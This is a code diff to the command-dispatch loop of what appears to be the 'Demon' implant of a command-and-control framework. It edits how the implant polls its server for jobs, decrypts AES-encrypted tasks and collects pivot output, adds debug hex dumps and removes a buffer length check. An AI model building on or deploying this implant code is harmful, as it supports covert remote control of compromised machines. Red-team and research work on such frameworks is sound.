@@ -48,7 +48,7 @@ VOID CommandDispatcher( VOID )
     LPVOID   TaskBuffer     = NULL;
     UINT32   TaskBufferSize = 0;
     UINT32   CommandID      = 0;
-    BOOL     AlreadyDec     = FALSE;
+    BOOL     PackageFirst   = TRUE;
     BOOL     FoundCommand   = FALSE;
 
     PRINTF( "Session ID => %x\n", Instance->Session.DemonID );
@@ -60,8 +60,7 @@ VOID CommandDispatcher( VOID )
 
         DxSleep( Instance->Config.Sleeping * 1000 );
 
-        AlreadyDec  = FALSE;
-        Package     = PackageCreate( DEMON_COMMAND_GET_JOB );
+        Package = PackageCreate( DEMON_COMMAND_GET_JOB );
 
         PackageAddInt32( Package, Instance->Session.DemonID );
         PackageTransmit( Package, &DataBuffer, &DataBufferSize );
@@ -71,9 +70,6 @@ VOID CommandDispatcher( VOID )
             ParserNew( &Parser, DataBuffer, DataBufferSize );
             do
             {
-                if ( Parser.Length < 8 )
-                    break;
-
                 CommandID  = ParserGetInt32( &Parser );
                 TaskBuffer = ParserGetBytes( &Parser, &TaskBufferSize );
 
@@ -84,11 +80,18 @@ VOID CommandDispatcher( VOID )
                     {
                         ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );
 
-                        if ( ! AlreadyDec )
-                        {
-                            ParserDecrypt( &TaskParser, Instance->Config.AES.Key, Instance->Config.AES.IV );
-                            AlreadyDec = TRUE;
-                        }
+                        PUTS( "Before decryption" )
+                        PRINT_HEX( TaskParser.Buffer, TaskParser.Length )
+
+                        ParserDecrypt( &TaskParser, Instance->Config.AES.Key, Instance->Config.AES.IV );
+
+                        if ( ! PackageFirst )
+                            ParserGetInt32( &TaskParser );
+                        else
+                            PackageFirst = FALSE;
+
+                        PUTS( "After decryption" )
+                        PRINT_HEX( TaskParser.Buffer, TaskParser.Length )
                     }
 
                     FoundCommand = FALSE;
@@ -125,7 +128,7 @@ VOID CommandDispatcher( VOID )
 
         // Check if we have something in our Pivots connection and sends back the output from the pipes
         PivotCollectOutput();
-
+        PackageFirst = TRUE;
     } while ( TRUE );
 
     Instance->Session.Connected = FALSE;
@@ -1009,7 +1012,7 @@ VOID CommandFS( PPARSER DataArgs )
 
         default:
         {
-            PUTS( "FS SubCommand not found" );
+            PRINTF( "FS SubCommand not found: %d : %x\n", Command, Command );
             break;
         }
     }
